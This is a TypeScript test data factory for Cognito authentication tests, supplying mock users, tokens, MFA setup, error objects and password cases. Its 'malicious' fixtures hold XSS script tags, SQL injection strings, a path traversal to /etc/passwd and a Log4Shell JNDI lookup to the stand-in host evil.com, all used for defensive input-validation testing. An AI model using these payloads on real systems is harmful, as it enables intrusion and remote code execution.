// file: apps/web/src/app/core/testing/auth-test-data.factory.ts
// author: Claude Code Assistant
// date: 2025-06-20
// description: Test data factory for authentication testing scenarios

import { AuthResponse } from '../models/AuthModel';
import { Users, IUsers } from '../models/UsersModel';
import { UserStatus } from '../models/UserStatusEnum';
import { UserGroup } from '../models/UserGroupEnum';

/**
 * Factory for creating consistent test data for authentication scenarios
 */
export class AuthTestDataFactory {

  /**
   * Create mock AuthResponse for successful operations
   */
  static createSuccessAuthResponse(data?: any): AuthResponse {
    return {
      StatusCode: 200,
      Message: 'Success',
      Data: data || null
    };
  }

  /**
   * Create mock AuthResponse for error scenarios
   */
  static createErrorAuthResponse(statusCode: number, message: string): AuthResponse {
    return {
      StatusCode: statusCode,
      Message: message,
      Data: null
    };
  }

  /**
   * Create mock user data for testing
   */
  static createMockUser(overrides?: Partial<IUsers>): Users {
    const defaultUser: Users = {
      userId: 'test-user-id-123',
      cognitoId: 'cognito-test-id-456',
      cognitoSub: 'cognito-sub-789',
      email: 'testuser@example.com',
      emailVerified: true,
      phoneNumber: '+1234567890',
      phoneVerified: true,
      firstName: 'Test',
      lastName: 'User',
      groups: ['USER'],
      status: UserStatus.ACTIVE,
      mfaEnabled: false,
      mfaSetupComplete: false,
      createdAt: '2024-01-01T00:00:00Z',
      updatedAt: '2024-01-01T00:00:00Z'
    };

    return { ...defaultUser, ...overrides };
  }

  /**
   * Create mock Cognito user attributes
   */
  static createMockCognitoAttributes(overrides?: Record<string, any>): Record<string, any> {
    const defaultAttributes = {
      sub: 'cognito-user-sub-123',
      email: 'testuser@example.com',
      email_verified: 'true',
      phone_number: '+1234567890',
      phone_number_verified: 'true',
      given_name: 'Test',
      family_name: 'User',
      'custom:user_id': 'test-user-id-123',
      'cognito:groups': ['USER']
    };

    return { ...defaultAttributes, ...overrides };
  }

  /**
   * Create mock Cognito session tokens
   */
  static createMockTokens(overrides?: any): any {
    const defaultTokens = {
      accessToken: {
        jwtToken: 'mock-access-token-jwt',
        payload: {
          sub: 'cognito-user-sub-123',
          'cognito:groups': ['USER'],
          token_use: 'access',
          scope: 'aws.cognito.signin.user.admin',
          auth_time: Math.floor(Date.now() / 1000),
          iat: Math.floor(Date.now() / 1000),
          exp: Math.floor(Date.now() / 1000) + 3600 // 1 hour from now
        }
      },
      idToken: {
        jwtToken: 'mock-id-token-jwt',
        payload: {
          sub: 'cognito-user-sub-123',
          email: 'testuser@example.com',
          email_verified: true,
          given_name: 'Test',
          family_name: 'User',
          token_use: 'id',
          auth_time: Math.floor(Date.now() / 1000),
          iat: Math.floor(Date.now() / 1000),
          exp: Math.floor(Date.now() / 1000) + 3600
        }
      },
      refreshToken: {
        token: 'mock-refresh-token'
      }
    };

    return { ...defaultTokens, ...overrides };
  }

  /**
   * Create expired tokens for testing
   */
  static createExpiredTokens(): any {
    const expiredTime = Math.floor(Date.now() / 1000) - 3600; // 1 hour ago
    return this.createMockTokens({
      accessToken: {
        jwtToken: 'expired-access-token',
        payload: {
          sub: 'cognito-user-sub-123',
          exp: expiredTime,
          iat: expiredTime - 3600
        }
      },
      idToken: {
        jwtToken: 'expired-id-token',
        payload: {
          sub: 'cognito-user-sub-123',
          exp: expiredTime,
          iat: expiredTime - 3600
        }
      }
    });
  }

  /**
   * Create malformed tokens for security testing
   */
  static createMalformedTokens(): any {
    return {
      accessToken: {
        jwtToken: 'malformed.token.here',
        payload: null
      },
      idToken: {
        jwtToken: 'another.malformed.token',
        payload: null
      },
      refreshToken: {
        token: null
      }
    };
  }

  /**
   * Create mock MFA setup details
   */
  static createMockMFASetup(overrides?: any): any {
    const defaultMFASetup = {
      totpEnabled: true,
      totpSetupComplete: true,
      secretCode: 'JBSWY3DPEHPK3PXP',
      qrCodeUrl: 'otpauth://totp/TestApp:testuser@example.com?secret=JBSWY3DPEHPK3PXP&issuer=TestApp',
      backupCodes: ['123456', '789012', '345678']
    };

    return { ...defaultMFASetup, ...overrides };
  }

  /**
   * Create test scenarios for different user states
   */
  static createUserScenarios(): Record<string, any> {
    return {
      // Active user with all verifications complete
      activeUser: {
        user: this.createMockUser({
          status: UserStatus.ACTIVE,
          emailVerified: true,
          phoneVerified: true,
          groups: ['USER']
        }),
        tokens: this.createMockTokens(),
        mfaEnabled: true
      },

      // New user requiring email verification
      unverifiedEmailUser: {
        user: this.createMockUser({
          status: UserStatus.PENDING,
          emailVerified: false,
          phoneVerified: false
        }),
        tokens: null,
        mfaEnabled: false
      },

      // Admin user with elevated privileges
      adminUser: {
        user: this.createMockUser({
          status: UserStatus.ACTIVE,
          groups: ['USER'],
          email: 'admin@example.com'
        }),
        tokens: this.createMockTokens({
          accessToken: {
            payload: {
              'cognito:groups': ['ADMIN', 'USER'],
              sub: 'admin-cognito-id'
            }
          }
        }),
        mfaEnabled: true
      },

      // Suspended user
      suspendedUser: {
        user: this.createMockUser({
          status: UserStatus.INACTIVE,
          email: 'suspended@example.com'
        }),
        tokens: null,
        mfaEnabled: false
      },

      // User with expired tokens
      expiredTokenUser: {
        user: this.createMockUser(),
        tokens: this.createExpiredTokens(),
        mfaEnabled: false
      },

      // User requiring MFA setup
      mfaSetupUser: {
        user: this.createMockUser({
          status: UserStatus.ACTIVE,
          emailVerified: true,
          phoneVerified: true
        }),
        tokens: this.createMockTokens(),
        mfaEnabled: false,
        mfaSetupRequired: true
      },

      // User with malicious data
      maliciousUser: {
        user: this.createMockUser({
          firstName: '<script>alert("xss")</script>',
          lastName: 'DROP TABLE users;',
          email: 'malicious@domain.com<script>'
        }),
        tokens: this.createMalformedTokens(),
        mfaEnabled: false
      }
    };
  }

  /**
   * Create mock Cognito errors for testing
   */
  static createCognitoErrors(): Record<string, any> {
    return {
      userNotFound: {
        name: 'UserNotFoundException',
        message: 'User does not exist'
      },
      invalidPassword: {
        name: 'NotAuthorizedException',
        message: 'Incorrect username or password'
      },
      userNotConfirmed: {
        name: 'UserNotConfirmedException',
        message: 'User is not confirmed'
      },
      tooManyAttempts: {
        name: 'TooManyRequestsException',
        message: 'Too many attempts'
      },
      passwordResetRequired: {
        name: 'PasswordResetRequiredException',
        message: 'Password reset required'
      },
      mfaRequired: {
        name: 'ChallengeName',
        challengeName: 'SOFTWARE_TOKEN_MFA'
      },
      codeExpired: {
        name: 'ExpiredCodeException',
        message: 'Invalid verification code provided, please try again'
      },
      codeMismatch: {
        name: 'CodeMismatchException',
        message: 'Invalid verification code provided, please try again'
      },
      networkError: {
        name: 'NetworkError',
        message: 'Network request failed'
      },
      tokenExpired: {
        name: 'NotAuthorizedException',
        message: 'Access Token has expired'
      }
    };
  }

  /**
   * Create test cases for authentication flows
   */
  static createAuthFlowTestCases(): Record<string, any> {
    return {
      validSignIn: {
        input: {
          username: 'testuser@example.com',
          password: 'SecureP@ssw0rd!'
        },
        expectedResponse: this.createSuccessAuthResponse({
          user: this.createMockUser(),
          requiresMFA: false,
          session: 'mock-session-token'
        })
      },

      invalidCredentials: {
        input: {
          username: 'invalid@example.com',
          password: 'wrongpassword'
        },
        expectedError: this.createCognitoErrors()['invalidPassword']
      },

      mfaRequired: {
        input: {
          username: 'mfauser@example.com',
          password: 'SecureP@ssw0rd!'
        },
        expectedResponse: this.createSuccessAuthResponse({
          requiresMFA: true,
          session: 'mfa-challenge-session',
          challengeName: 'SOFTWARE_TOKEN_MFA'
        })
      },

      rateLimited: {
        input: {
          username: 'testuser@example.com',
          password: 'wrongpassword'
        },
        expectedError: this.createCognitoErrors()['tooManyAttempts']
      },

      maliciousInput: {
        input: {
          username: '<script>alert("xss")</script>@domain.com',
          password: '\'; DROP TABLE users; --'
        },
        expectedError: {
          name: 'ValidationException',
          message: 'Invalid input format'
        }
      }
    };
  }

  /**
   * Create mock network responses for different scenarios
   */
  static createNetworkResponses(): Record<string, any> {
    return {
      success: {
        status: 200,
        data: this.createSuccessAuthResponse()
      },
      unauthorized: {
        status: 401,
        error: 'Unauthorized'
      },
      forbidden: {
        status: 403,
        error: 'Forbidden'
      },
      tooManyRequests: {
        status: 429,
        error: 'Too Many Requests'
      },
      internalError: {
        status: 500,
        error: 'Internal Server Error'
      },
      networkTimeout: {
        status: 0,
        error: 'Network timeout'
      }
    };
  }

  /**
   * Create comprehensive password test cases
   */
  static createPasswordTestCases(): Record<string, any> {
    return {
      valid: [
        'SecureP@ssw0rd!',
        'MyStr0ng!P@ssword',
        'C0mpl3x!P@ssW0rd#',
        'Unbreakable123!@#'
      ],
      weak: [
        'password',
        '123456',
        'qwerty',
        'abc123',
        'Password1', // Missing special char
        'password!', // Missing uppercase
        'PASSWORD!', // Missing lowercase
        'Pass1!'     // Too short
      ],
      malicious: [
        '\'; DROP TABLE users; --',
        '<script>alert("xss")</script>',
        'password\u0000',
        'password\r\n',
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/x}'
      ]
    };
  }

  /**
   * Generate large dataset for performance testing
   */
  static createPerformanceTestData(count: number): any[] {
    const testData = [];
    for (let i = 0; i < count; i++) {
      testData.push({
        user: this.createMockUser({
          userId: `performance-test-user-${i}`,
          email: `testuser${i}@example.com`,
          cognitoId: `cognito-id-${i}`
        }),
        credentials: {
          username: `testuser${i}@example.com`,
          password: `TestPassword${i}!`
        }
      });
    }
    return testData;
  }
}